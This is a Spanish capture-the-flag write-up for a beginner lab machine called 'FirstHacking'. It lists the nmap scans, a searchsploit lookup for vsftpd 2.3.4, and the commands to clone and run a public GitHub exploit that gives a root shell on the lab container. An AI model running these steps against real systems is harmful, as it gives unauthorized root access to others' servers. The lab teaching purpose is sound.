---
description: >-
  ✍️ Autor: El Pingüino de Mario🔍 Dificultad: Muy Fácil  📅 Fecha de creación:
  01/01/2000
---

# FirstHacking

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/0 (2).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

![](<../../.gitbook/assets/1 (2).png>)

> Nota: he pegado una foto que no es de esta máquina. Lo demás está bien.

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP** está abierto por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Para saber más información sobre el puerto abierto, se realiza el siguiente comando:

```bash
nmap -sCV -p21 172.17.0.2 -oN targeted
```

![](<../../.gitbook/assets/2 (2).png>)

Como se puede observar, la versión del servicio **FTP** nos puede ayudar, ya que podría ser vulnerable. Para verificar esto, realizamos el comando:

```bash
searchsploit vsftpd 2.3.4
```

<figure><img src="../../.gitbook/assets/3 (2).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

En este caso, utilizaremos un exploit que encontramos en GitHub. Seguimos las instrucciones indicadas en la página, lo que nos permite crear una reverse shell con privilegios de usuario **root** en la máquina. Para ello, se realizan los siguientes comandos:

```bash
sudo python3 -m pip install pwntools
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
cd vsftpd_2.3.4_Exploit/
chmod +x exploit.py
```

Para continuar con la fase de explotación, creamos un entorno virtual para ejecutar el exploit con los siguientes comandos:

```bash
python3 -m venv myenv
source myenv/bin/activate
pip install --upgrade pip
pip install pwntools
```

A continuación, ya podemos ejecutar el exploit con:

```bash
python3 exploit.py 172.17.0.2
```

![](<../../.gitbook/assets/4 (2).png>)

### 🔐 **PRIVILEGIOS**

Tras estar dentro de la shell, comprobamos quiénes somos a través de:

```bash
whoami
```

![](<../../.gitbook/assets/5 (2).png>)

Observamos que somos **root** por lo que tenemos el máximo de privilegios.
